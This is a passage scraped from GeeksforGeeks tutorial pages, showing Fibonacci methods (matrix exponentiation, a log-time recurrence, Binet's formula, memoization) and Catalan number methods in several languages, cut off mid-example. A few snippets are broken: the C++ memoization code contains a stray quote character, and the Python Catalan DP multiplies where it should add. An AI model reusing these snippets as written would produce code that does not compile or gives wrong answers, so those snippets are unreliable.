M); } /* Driver program to test above function */ public static void Main () { int n = 9; Console.WriteLine(fib(n)); } } // This code is contributed by anuj_67. chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php function fib($n) { $F = array(array(1, 1), array(1, 0)); if ($n == 0) return 0; power($F, $n - 1); return $F[0][0]; } function multiply(&$F, &$M) { $x = $F[0][0] * $M[0][0] + $F[0][1] * $M[1][0]; $y = $F[0][0] * $M[0][1] + $F[0][1] * $M[1][1]; $z = $F[1][0] * $M[0][0] + $F[1][1] * $M[1][0]; $w = $F[1][0] * $M[0][1] + $F[1][1] * $M[1][1]; $F[0][0] = $x; $F[0][1] = $y; $F[1][0] = $z; $F[1][1] = $w; } function power(&$F, $n) { $M = array(array(1, 1), array(1, 0)); // n - 1 times multiply the // matrix to {{1,0},{0,1}} for ($i = 2; $i <= $n; $i++) multiply($F, $M); } // Driver Code $n = 9; echo fib($n); // This code is contributed // by ChitraNayal ?> chevron_right filter_none Output 34 Time Complexity: O(n) Extra Space: O(1) Method 5 ( Optimized Method 4 ) The method 4 can be optimized to work in O(Logn) time complexity. We can do recursive multiplication to get power(M, n) in the previous method (Similar to the optimization done in this post) C++ filter_none edit close play_arrow link brightness_4 code // Fibonacci Series using Optimized Method #include <bits/stdc++.h> using namespace std; void multiply(int F[2][2], int M[2][2]); void power(int F[2][2], int n); // Function that returns nth Fibonacci number int fib(int n) { int F[2][2] = {{1, 1}, {1, 0}}; if (n == 0) return 0; power(F, n - 1); return F[0][0]; } // Optimized version of power() in method 4 void power(int F[2][2], int n) { if(n == 0 || n == 1) return; int M[2][2] = {{1, 1}, {1, 0}}; power(F, n / 2); multiply(F, F); if (n % 2 != 0) multiply(F, M); } void multiply(int F[2][2], int M[2][2]) { int x = F[0][0] * M[0][0] + F[0][1] * M[1][0]; int y = F[0][0] * M[0][1] + F[0][1] * M[1][1]; int z = F[1][0] * M[0][0] + F[1][1] * M[1][0]; int w = F[1][0] * M[0][1] + F[1][1] * M[1][1]; F[0][0] = x; F[0][1] = y; F[1][0] = z; F[1][1] = w; } // Driver code int main() { int n = 9; cout << fib(9); getchar(); return 0; } // This code is contributed by Nidhi_biet chevron_right filter_none C filter_none edit close play_arrow link brightness_4 code #include <stdio.h> void multiply(int F[2][2], int M[2][2]); void power(int F[2][2], int n); /* function that returns nth Fibonacci number */ int fib(int n) { int F[2][2] = {{1,1},{1,0}}; if (n == 0) return 0; power(F, n-1); return F[0][0]; } /* Optimized version of power() in method 4 */ void power(int F[2][2], int n) { if( n == 0 || n == 1) return; int M[2][2] = {{1,1},{1,0}}; power(F, n/2); multiply(F, F); if (n%2 != 0) multiply(F, M); } void multiply(int F[2][2], int M[2][2]) { int x = F[0][0]*M[0][0] + F[0][1]*M[1][0]; int y = F[0][0]*M[0][1] + F[0][1]*M[1][1]; int z = F[1][0]*M[0][0] + F[1][1]*M[1][0]; int w = F[1][0]*M[0][1] + F[1][1]*M[1][1]; F[0][0] = x; F[0][1] = y; F[1][0] = z; F[1][1] = w; } /* Driver program to test above function */ int main() { int n = 9; printf("%d", fib(9)); getchar(); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code //Fibonacci Series using Optimized Method class fibonacci { /* function that returns nth Fibonacci number */ static int fib(int n) { int F[][] = new int[][]{{1,1},{1,0}}; if (n == 0) return 0; power(F, n-1); return F[0][0]; } static void multiply(int F[][], int M[][]) { int x = F[0][0]*M[0][0] + F[0][1]*M[1][0]; int y = F[0][0]*M[0][1] + F[0][1]*M[1][1]; int z = F[1][0]*M[0][0] + F[1][1]*M[1][0]; int w = F[1][0]*M[0][1] + F[1][1]*M[1][1]; F[0][0] = x; F[0][1] = y; F[1][0] = z; F[1][1] = w; } /* Optimized version of power() in method 4 */ static void power(int F[][], int n) { if( n == 0 || n == 1) return; int M[][] = new int[][]{{1,1},{1,0}}; power(F, n/2); multiply(F, F); if (n%2 != 0) multiply(F, M); } /* Driver program to test above function */ public static void main (String args[]) { int n = 9; System.out.println(fib(n)); } } /* This code is contributed by Rajat Mishra */ chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # Fibonacci Series using # Optimized Method # function that returns nth # Fibonacci number def fib(n): F = [[1, 1], [1, 0]] if (n == 0): return 0 power(F, n - 1) return F[0][0] def multiply(F, M): x = (F[0][0] * M[0][0] + F[0][1] * M[1][0]) y = (F[0][0] * M[0][1] + F[0][1] * M[1][1]) z = (F[1][0] * M[0][0] + F[1][1] * M[1][0]) w = (F[1][0] * M[0][1] + F[1][1] * M[1][1]) F[0][0] = x F[0][1] = y F[1][0] = z F[1][1] = w # Optimized version of # power() in method 4 def power(F, n): if( n == 0 or n == 1): return; M = [[1, 1], [1, 0]]; power(F, n // 2) multiply(F, F) if (n % 2 != 0): multiply(F, M) # Driver Code if __name__ == "__main__": n = 9 print(fib(n)) # This code is contributed # by ChitraNayal chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // Fibonacci Series using // Optimized Method using System; class GFG { /* function that returns nth Fibonacci number */ static int fib(int n) { int[,] F = new int[,]{{1, 1}, {1, 0}}; if (n == 0) return 0; power(F, n - 1); return F[0, 0]; } static void multiply(int[,] F, int[,] M) { int x = F[0, 0] * M[0, 0] + F[0, 1] * M[1, 0]; int y = F[0, 0] * M[0, 1] + F[0, 1] * M[1, 1]; int z = F[1, 0] * M[0, 0] + F[1, 1] * M[1, 0]; int w = F[1, 0] * M[0, 1] + F[1, 1] * M[1, 1]; F[0, 0] = x; F[0, 1] = y; F[1, 0] = z; F[1, 1] = w; } /* Optimized version of power() in method 4 */ static void power(int[,] F, int n) { if( n == 0 || n == 1) return; int[,] M = new int[,]{{1, 1}, {1, 0}}; power(F, n / 2); multiply(F, F); if (n % 2 != 0) multiply(F, M); } // Driver Code public static void Main () { int n = 9; Console.Write(fib(n)); } } // This code is contributed // by ChitraNayal chevron_right filter_none Output 34 Time Complexity: O(Logn) Extra Space: O(Logn) if we consider the function call stack size, otherwise O(1). Method 6 (O(Log n) Time) Below is one more interesting recurrence formula that can be used to find n’th Fibonacci Number in O(Log n) time. If n is even then k = n/2: F(n) = [2*F(k-1) + F(k)]*F(k) If n is odd then k = (n + 1)/2 F(n) = F(k)*F(k) + F(k-1)*F(k-1) How does this formula work? The formula can be derived from above matrix equation. Taking determinant on both sides, we get (-1)n = Fn+1Fn-1 – Fn2 Moreover, since AnAm = An+m for any square matrix A, the following identities can be derived (they are obtained form two different coefficients of the matrix product)FmFn + Fm-1Fn-1 = Fm+n-1By putting n = n+1,FmFn+1 + Fm-1Fn = Fm+nPutting m = nF2n-1 = Fn2 + Fn-12F2n = (Fn-1 + Fn+1)Fn = (2Fn-1 + Fn)Fn (Source: Wiki)To get the formula to be proved, we simply need to do the following If n is even, we can put k = n/2 If n is odd, we can put k = (n+1)/2 Below is the implementation of above idea. C++ filter_none edit close play_arrow link brightness_4 code // C++ Program to find n'th fibonacci Number in // with O(Log n) arithmatic operations #include <bits/stdc++.h> using namespace std; const int MAX = 1000; // Create an array for memoization int f[MAX] = {0}; // Returns n'th fuibonacci number using table f[] int fib(int n) { // Base cases if (n == 0) return 0; if (n == 1 || n == 2) return (f[n] = 1); // If fib(n) is already computed if (f[n]) return f[n]; int k = (n & 1)? (n+1)/2 : n/2; // Applying above formula [Note value n&1 is 1 // if n is odd, else 0. f[n] = (n & 1)? (fib(k)*fib(k) + fib(k-1)*fib(k-1)) : (2*fib(k-1) + fib(k))*fib(k); return f[n]; } /* Driver program to test above function */ int main() { int n = 9; printf("%d ", fib(n)); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java Program to find n'th fibonacci // Number with O(Log n) arithmetic operations import java.util.*; class GFG { static int MAX = 1000; static int f[]; // Returns n'th fibonacci number using // table f[] public static int fib(int n) { // Base cases if (n == 0) return 0; if (n == 1 || n == 2) return (f[n] = 1); // If fib(n) is already computed if (f[n] != 0) return f[n]; int k = (n & 1) == 1? (n + 1) / 2 : n / 2; // Applying above formula [Note value // n&1 is 1 if n is odd, else 0. f[n] = (n & 1) == 1? (fib(k) * fib(k) + fib(k - 1) * fib(k - 1)) : (2 * fib(k - 1) + fib(k)) * fib(k); return f[n]; } /* Driver program to test above function */ public static void main(String[] args) { int n = 9; f= new int[MAX]; System.out.println(fib(n)); } } // This code is contributed by Arnav Kr. Mandal. chevron_right filter_none Python filter_none edit close play_arrow link brightness_4 code # Python3 Program to find n'th fibonacci Number in # with O(Log n) arithmatic operations MAX = 1000 # Create an array for memoization f = [0] * MAX # Returns n'th fuibonacci number using table f[] def fib(n) : # Base cases if (n == 0) : return 0 if (n == 1 or n == 2) : f[n] = 1 return (f[n]) # If fib(n) is already computed if (f[n]) : return f[n] if( n & 1) : k = (n + 1) // 2 else : k = n // 2 # Applying above formula [Note value n&1 is 1 # if n is odd, else 0. if((n & 1) ) : f[n] = (fib(k) * fib(k) + fib(k-1) * fib(k-1)) else : f[n] = (2*fib(k-1) + fib(k))*fib(k) return f[n] # Driver code n = 9 print(fib(n)) # This code is contributed by Nikita Tiwari. chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# Program to find n'th // fibonacci Number with // O(Log n) arithmetic operations using System; class GFG { static int MAX = 1000; static int[] f; // Returns n'th fibonacci // number using table f[] public static int fib(int n) { // Base cases if (n == 0) return 0; if (n == 1 || n == 2) return (f[n] = 1); // If fib(n) is already // computed if (f[n] != 0) return f[n]; int k = (n & 1) == 1 ? (n + 1) / 2 : n / 2; // Applying above formula // [Note value n&1 is 1 if // n is odd, else 0. f[n] = (n & 1) == 1 ? (fib(k) * fib(k) + fib(k - 1) * fib(k - 1)) : (2 * fib(k - 1) + fib(k)) * fib(k); return f[n]; } // Driver Code static void Main() { int n = 9; f = new int[MAX]; Console.WriteLine(fib(n)); } } // This code is contributed by mits chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // PHP Program to find n'th // fibonacci Number in with // O(Log n) arithmatic operations $MAX = 1000; // Returns n'th fuibonacci // number using table f[] function fib($n) { global $MAX; // Create an array for memoization $f = array_fill(0, $MAX, NULL); // Base cases if ($n == 0) return 0; if ($n == 1 || $n == 2) return ($f[$n] = 1); // If fib(n) is already computed if ($f[$n]) return $f[$n]; $k = ($n & 1) ? ($n + 1) / 2 : $n / 2; // Applying above formula // [Note value n&1 is 1 if // n is odd, else 0. $f[$n] = ($n & 1) ? (fib($k) * fib($k) + fib($k - 1) * fib($k - 1)) : (2 * fib($k - 1) + fib($k)) * fib($k); return $f[$n]; } // Driver Code $n = 9; echo fib($n); // This code is contributed // by ChitraNayal ?> chevron_right filter_none Output 34 Time complexity of this solution is O(Log n) as we divide the problem to half in every recursive call. Method 7 Another approach:(Using formula) In this method we directly implement the formula for nth term in the fibonacci series. Fn = {[(√5 + 1)/2] ^ n} / √5 Reference: http://www.maths.surrey.ac.uk/hosted-sites/R.Knott/Fibonacci/fibFormula.html C++ filter_none edit close play_arrow link brightness_4 code // C++ Program to find n'th fibonacci Number #include<iostream> #include<cmath> int fib(int n) { double phi = (1 + sqrt(5)) / 2; return round(pow(phi, n) / sqrt(5)); } // Driver Code int main () { int n = 9; std::cout << fib(n) << std::endl; return 0; } //This code is contributed by Lokesh Mohanty. chevron_right filter_none C filter_none edit close play_arrow link brightness_4 code // C Program to find n'th fibonacci Number #include<stdio.h> #include<math.h> int fib(int n) { double phi = (1 + sqrt(5)) / 2; return round(pow(phi, n) / sqrt(5)); } int main () { int n = 9; printf("%d", fib(n)); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java Program to find n'th fibonacci Number import java.util.*; class GFG { static int fib(int n) { double phi = (1 + Math.sqrt(5)) / 2; return (int) Math.round(Math.pow(phi, n) / Math.sqrt(5)); } // Driver Code public static void main(String[] args) { int n = 9; System.out.println(fib(n)); } } // This code is contributed by PrinciRaj1992 chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # Python3 program to find n'th # fibonacci Number import math def fibo(n): phi = (1 + math.sqrt(5)) / 2 return round(pow(phi, n) / math.sqrt(5)) # Driver code if __name__ == '__main__': n = 9 print(fibo(n)) # This code is contributed by prasun_parate chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# Program to find n'th fibonacci Number using System; public class GFG { static int fib(int n) { double phi = (1 + Math.Sqrt(5)) / 2; return (int) Math.Round(Math.Pow(phi, n) / Math.Sqrt(5)); } // Driver code public static void Main() { int n = 9; Console.WriteLine(fib(n)); } } // This code is contributed by 29AjayKumar chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // PHP Program to find n'th // fibonacci Number function fib($n) { $phi = (1 + sqrt(5)) / 2; return round(pow($phi, $n) / sqrt(5)); } // Driver Code $n = 9; echo fib($n) ; // This code is contributed by Ryuga ?> chevron_right filter_none Output 34 Time Complexity: O(1) Space Complexity: O(1) Method 8: DP using memoization(Top down approach) We can avoid the repeated work done is method 1 by storing the Fibonacci numbers calculated so far. We just need to store all the values in an array. C++ filter_none edit close play_arrow link brightness_4 code #include <bits/stdc++.h> using namespace std; int dp[10]; int fib(int n) { if (n <= 1) return n; // temporary variables to store // values of fib(n-1) & fib(n-2) int first, second; if (dp[n - 1] != -1) ' first = dp[n - 1]; else first = fib(n - 1); if (dp[n - 2] != -1) second = dp[n - 2]; else second = fib(n - 2); // memoization return dp[n] = first + second; } // Driver Code int main() { int n = 9; memset(dp, -1, sizeof(dp)); cout << fib(n); getchar(); return 0; // This code is contributed by Bhavneet Singh } chevron_right filter_none Output 34 This method is contributed by Chirag Agarwal.Related Articles: Large Fibonacci Numbers in JavaPlease write comments if you find the above codes/algorithms incorrect, or find other ways to solve the same problem.References: http://en.wikipedia.org/wiki/Fibonacci_number http://www.ics.uci.edu/~eppstein/161/960109.html Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Check if a M-th fibonacci number divides N-th fibonacci numberCheck if sum of Fibonacci elements in an Array is a Fibonacci number or notC Program for Fibonacci numbersProgram to print first n Fibonacci Numbers | Set 1Count Fibonacci numbers in given range in O(Log n) time and O(1) spaceSum of Fibonacci NumbersNon Fibonacci NumbersGCD and Fibonacci NumbersEven Fibonacci Numbers SumLargest subset whose all elements are Fibonacci numbersInteresting facts about Fibonacci numbersThe Magic of Fibonacci NumbersPrime numbers and FibonacciPrint first n Fibonacci Numbers using direct formulaGenerating large Fibonacci numbers using boost libraryDeriving the expression of Fibonacci Numbers in terms of golden ratioNumber of ways to represent a number as sum of k fibonacci numbersAlternate Fibonacci NumbersFind the GCD of N Fibonacci Numbers with given IndicesSum of squares of Fibonacci numbersImproved By : jit_t, vt_m, humblezero, Mithun Kumar, chitranayal, more LokeshMohanty, ankthon, Akanksha_Rai, princiraj1992, 29AjayKumar, SoumikMondal, nidhi_biet, Code_Mech, prasun_parate, bhavneet2000, shivanisinghss2110 Article Tags : Dynamic ProgrammingMathematicalAmazonBloombergFibonacciMakeMyTripMAQ Softwarematrix-exponentiationModular ArithmeticseriesSnapdeal Practice Tags : AmazonSnapdealMakeMyTripMAQ SoftwareBloombergDynamic ProgrammingMathematicalseriesFibonacciModular Arithmetic thumb_up 150 To-do Done 3 Based on 344 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Print all combinations of balanced parentheses Next last_page Overlapping Subproblems Property in Dynamic Programming | DP-1 Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Dynamic Programming Partition problem | DP-18Bellman–Ford Algorithm | DP-23Travelling Salesman Problem | Set 1 (Naive and Dynamic Programming)Floyd Warshall Algorithm | DP-16Matrix Chain Multiplication | DP-8 Most visited in Mathematical C++ Data TypesSet in C++ Standard Template Library (STL)Write a program to print all permutations of a given stringProgram for factorial of a numberProgram to find GCD or HCF of two numbers room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Program for nth Catalan Number - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Program for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueGreedy Algorithm to find Minimum number of CoinsK Centers Problem | Set 1 (Greedy Approximate Algorithm)Minimum Number of Platforms Required for a Railway/Bus StationReverse an array in groups of given sizeK’th Smallest/Largest Element in Unsorted Array | Set 1K’th Smallest/Largest Element in Unsorted Array | Set 2 (Expected Linear Time)K’th Smallest/Largest Element in Unsorted Array | Set 3 (Worst Case Linear Time)K’th Smallest/Largest Element using STLk largest(or smallest) elements in an array | added Min Heap methodSort a nearly sorted (or K sorted) arrayMerge k sorted arrays | Set 1Largest Sum Contiguous Subarray0-1 Knapsack Problem | DP-10Longest Common Subsequence | DP-4Longest Increasing Subsequence | DP-3Subset Sum Problem | DP-25Longest Palindromic Substring | Set 1Sieve of EratosthenesTop 20 Dynamic Programming Interview Questions Program for nth Catalan Number Last Updated: 04-11-2020 Catalan numbers are a sequence of natural numbers that occurs in many interesting counting problems like following.1) Count the number of expressions containing n pairs of parentheses which are correctly matched. For n = 3, possible expressions are ((())), ()(()), ()()(), (())(), (()()).2) Count the number of possible Binary Search Trees with n keys (See this)3) Count the number of full binary trees (A rooted binary tree is full if every vertex has either two children or no children) with n+1 leaves.4) Given a number n, return the number of ways you can draw n chords in a circle with 2 x n points such that no 2 chords intersect.See this for more applications. The first few Catalan numbers for n = 0, 1, 2, 3, … are 1, 1, 2, 5, 14, 42, 132, 429, 1430, 4862, … Recommended: Please solve it on “PRACTICE ” first, before moving on to the solution. Recursive Solution Catalan numbers satisfy the following recursive formula. Following is the implementation of above recursive formula. C++ filter_none edit close play_arrow link brightness_4 code #include <iostream> using namespace std; // A recursive function to find nth catalan number unsigned long int catalan(unsigned int n) { // Base case if (n <= 1) return 1; // catalan(n) is sum of // catalan(i)*catalan(n-i-1) unsigned long int res = 0; for (int i = 0; i < n; i++) res += catalan(i) * catalan(n - i - 1); return res; } // Driver code int main() { for (int i = 0; i < 10; i++) cout << catalan(i) << " "; return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code class CatalnNumber { // A recursive function to find nth catalan number int catalan(int n) { int res = 0; // Base case if (n <= 1) { return 1; } for (int i = 0; i < n; i++) { res += catalan(i) * catalan(n - i - 1); } return res; } // Driver Code public static void main(String[] args) { CatalnNumber cn = new CatalnNumber(); for (int i = 0; i < 10; i++) { System.out.print(cn.catalan(i) + " "); } } } chevron_right filter_none Python filter_none edit close play_arrow link brightness_4 code # A recursive function to # find nth catalan number def catalan(n): # Base Case if n <= 1: return 1 # Catalan(n) is the sum # of catalan(i)*catalan(n-i-1) res = 0 for i in range(n): res += catalan(i) * catalan(n-i-1) return res # Driver Code for i in range(10): print catalan(i), # This code is contributed by # Nikhil Kumar Singh (nickzuck_007) chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // A recursive C# program to find // nth catalan number using System; class GFG { // A recursive function to find // nth catalan number static int catalan(int n) { int res = 0; // Base case if (n <= 1) { return 1; } for (int i = 0; i < n; i++) { res += catalan(i) * catalan(n - i - 1); } return res; } // Driver Code public static void Main() { for (int i = 0; i < 10; i++) Console.Write(catalan(i) + " "); } } // This code is contributed by // nitin mittal. chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // PHP Program for nth // Catalan Number // A recursive function to // find nth catalan number function catalan($n) { // Base case if ($n <= 1) return 1; // catalan(n) is sum of // catalan(i)*catalan(n-i-1) $res = 0; for($i = 0; $i < $n; $i++) $res += catalan($i) * catalan($n - $i - 1); return $res; } // Driver Code for ($i = 0; $i < 10; $i++) echo catalan($i), " "; // This code is contributed aj_36 ?> chevron_right filter_none Output 1 1 2 5 14 42 132 429 1430 4862 Time complexity of above implementation is equivalent to nth catalan number. The value of nth catalan number is exponential that makes the time complexity exponential. Dynamic Programming Solution : We can observe that the above recursive implementation does a lot of repeated work (we can the same by drawing recursion tree). Since there are overlapping subproblems, we can use dynamic programming for this. Following is a Dynamic programming based implementation . C++ filter_none edit close play_arrow link brightness_4 code #include <iostream> using namespace std; // A dynamic programming based function to find nth // Catalan number unsigned long int catalanDP(unsigned int n) { // Table to store results of subproblems unsigned long int catalan[n + 1]; // Initialize first two values in table catalan[0] = catalan[1] = 1; // Fill entries in catalan[] using recursive formula for (int i = 2; i <= n; i++) { catalan[i] = 0; for (int j = 0; j < i; j++) catalan[i] += catalan[j] * catalan[i - j - 1]; } // Return last entry return catalan[n]; } // Driver code int main() { for (int i = 0; i < 10; i++) cout << catalanDP(i) << " "; return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code class GFG { // A dynamic programming based function to find nth // Catalan number static int catalanDP(int n) { // Table to store results of subproblems int catalan[] = new int[n + 2]; // Initialize first two values in table catalan[0] = 1; catalan[1] = 1; // Fill entries in catalan[] // using recursive formula for (int i = 2; i <= n; i++) { catalan[i] = 0; for (int j = 0; j < i; j++) { catalan[i] += catalan[j] * catalan[i - j - 1]; } } // Return last entry return catalan[n]; } // Driver code public static void main(String[] args) { for (int i = 0; i < 10; i++) { System.out.print(catalanDP(i) + " "); } } } // This code contributed by Rajput-Ji chevron_right filter_none Python filter_none edit close play_arrow link brightness_4 code # A dynamic programming based function to find nth # Catalan number def catalan(n): if (n == 0 or n == 1): return 1 # Table to store results of subproblems catalan = [0 for i in range(n + 1)] # Initialize first two values in table catalan[0] = 1 catalan[1] = 1 # Fill entries in catalan[] # using recursive formula for i in range(2, n + 1): catalan[i] = 0 for j in range(i): catalan[i] += catalan[j] catalan[i] *= catalan[i-j-1] # Return last entry return catalan[n] # Driver code for i in range(10): print(catalan(i), end=" ") # This code is contributed by Aditi Sharma chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code using System; class GFG { // A dynamic programming based // function to find nth // Catalan number static uint catalanDP(uint n) { // Table to store results of subproblems uint[] catalan = new uint[n + 2]; // Initialize first two values in table catalan[0] = catalan[1] = 1; // Fill entries in catalan[] // using recursive formula for (uint i = 2; i <= n; i++) { catalan[i] = 0; for (uint j = 0; j < i; j++) catalan[i] += catalan[j] * catalan[i - j - 1]; } // Return last entry return catalan[n]; } // Driver code static void Main() { for (uint i = 0; i < 10; i++) Console.Write(catalanDP(i) + " "); } } // This code is contributed by Chandan_jnu chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // PHP program for nth Catalan Number // A dynamic programming based function // to find nth Catalan number function catalanDP( $n) { // Table to store results // of subproblems $catalan= array(); // Initialize first two // values in table $catalan[0] = $catalan[1] = 1; // Fill entries in catalan[] // using recursive formula for ($i = 2; $i <= $n; $i++) { $catalan[$i] = 0; for ( $j = 0; $j < $i; $j++) $catalan[$i] += $catalan[$j] * $catalan[$i - $j - 1]; } // Return last entry return $catalan[$n]; } // Driver Code for ($i = 0; $i < 10; $i++) echo catalanDP($i) , " "; // This code is contributed anuj_67. ?> chevron_right filter_none Output 1 1 2 5 14 42 132 429 1430 4862 Time Complexity: Time complexity of above implementation is O(n2) Using Binomial Coefficient We can also use the below formula to find nth Catalan number in O(n) time. We have discussed a O(n) approach to find binomial coefficient nCr. C++ filter_none edit close play_arrow link brightness_4 code // C++ program for nth Catalan Number #include <iostream> using namespace std; // Returns value of Binomial Coefficient C(n, k) unsigned long int binomialCoeff(unsigned int n, unsigned int k) { unsigned long int res = 1; // Since C(n, k) = C(n, n-k) if (k > n - k) k = n - k; // Calculate value of [n*(n-1)*---*(n-k+1)] / // [k*(k-1)*---*1] for (int i = 0; i < k; ++i) { res *= (n - i); res /= (i + 1); } return res; } // A Binomial coefficient based function to find nth catalan // number in O(n) time unsigned long int catalan(unsigned int n) { // Calculate value of 2nCn unsigned long int c = binomialCoeff(2 * n, n); // return 2nCn/(n+1) return c / (n + 1); } // Driver code int main() { for (int i = 0; i < 10; i++) cout << catalan(i) << " "; return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java program for nth Catalan Number class GFG { // Returns value of Binomial Coefficient C(n, k) static long binomialCoeff(int n, int k) { long res = 1; // Since C(n, k) = C(n, n-k) if (k > n - k) { k = n - k; } // Calculate value of [n*(n-1)*---*(n-k+1)] / // [k*(k-1)*---*1] for (int i = 0; i < k; ++i) { res *= (n - i); res /= (i + 1); } return res; } // A Binomial coefficient based function // to find nth catalan number in O(n) time static long catalan(int n) { // Calculate value of 2nCn long c = binomialCoeff(2 * n, n); // return 2nCn/(n+1) return c / (n + 1); } // Driver code public static void main(String[] args) { for (int i = 0; i < 10; i++) { System.out.print(catalan(i) + " "); } } } chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # Python program for nth Catalan Number # Returns value of Binomial Coefficient C(n, k) def binomialCoefficient(n, k): # since C(n, k) = C(n, n - k) if (k > n - k): k = n - k # initialize result res = 1 # Calculate value of [n * (n-1) *---* (n-k + 1)] # / [k * (k-1) *----* 1] for i in range(k): res = res * (n - i) res = res / (i + 1) return res # A Binomial coefficient based function to # find nth catalan number in O(n) time def catalan(n): c = binomialCoefficient(2*n, n) return c/(n + 1) # Driver Code for i in range(10): print(catalan(i), end=" ") # This code is contributed by Aditi Sharma chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# program for nth Catalan Number using System; class GFG { // Returns value of Binomial Coefficient C(n, k) static long binomialCoeff(int n, int k) { long res = 1; // Since C(n, k) = C(n, n-k) if (k > n - k) { k = n - k; } // Calculate value of [n*(n-1)*---*(n-k+1)] / // [k*(k-1)*---*1] for (int i = 0; i < k; ++i) { res *= (n - i); res /= (i + 1); } return res; } // A Binomial coefficient based function to find nth // catalan number in O(n) time static long catalan(int n) { // Calculate value of 2nCn long c = binomialCoeff(2 * n, n); // return 2nCn/(n+1) return c / (n + 1); } // Driver code public static void Main() { for (int i = 0; i < 10; i++) { Console.Write(catalan(i) + " "); } } } // This code is contributed // by Akanksha Rai chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // PHP program for nth Catalan Number // Returns value of Binomial // Coefficient C(n, k) function binomialCoeff($n, $k) { $res = 1; // Since C(n, k) = C(n, n-k) if ($k > $n - $k) $k = $n - $k; // Calculate value of [n*(n-1)*---*(n-k+1)] / // [k*(k-1)*---*1] for ($i = 0; $i < $k; ++$i) { $res *= ($n - $i); $res = floor($res / ($i + 1)); } return $res; } // A Binomial coefficient based function // to find nth catalan number in O(n) time function catalan($n) { // Calculate value of 2nCn $c = binomialCoeff(2 * ($n), $n); // return 2nCn/(n+1) return floor($c / ($n + 1)); } // Driver code for ($i = 0; $i < 10; $i++) echo catalan($i), " " ; // This code is contributed by Ryuga ?> chevron_right filter_none Output 1 1 2 5 14 42 132 429 1430 4862 Time Complexity: Time complexity of above implementation is O(n).We can also use below formula to find nth catalan number in O(n) time. Use multi-precision library: In this method, we have used boost multi-precision library, and the motive behind its use is just only to have precision meanwhile finding the large CATALAN’s number and a generalized technique using for loop to calculate Catalan numbers . For example: N = 5 Initially set cat_=1 then, print cat_ , then, iterate from i = 1 to i < 5 for i = 1; cat_ = cat_ * (4*1-2)=1*2=2cat_ = cat_ / (i+1)=2/2 = 1 For i = 2; cat_ = cat_ * (4*2-2)=1*6=6cat_ = cat_ / (i+1)=6/3=2 For i = 3 :- cat_ = cat_ * (4*3-2)=2*10=20cat_ = cat_ / (i+1)=20/4=5 For i = 4 :- cat_ = cat_ * (4*4-2)=5*14=70 cat_ = cat_ / 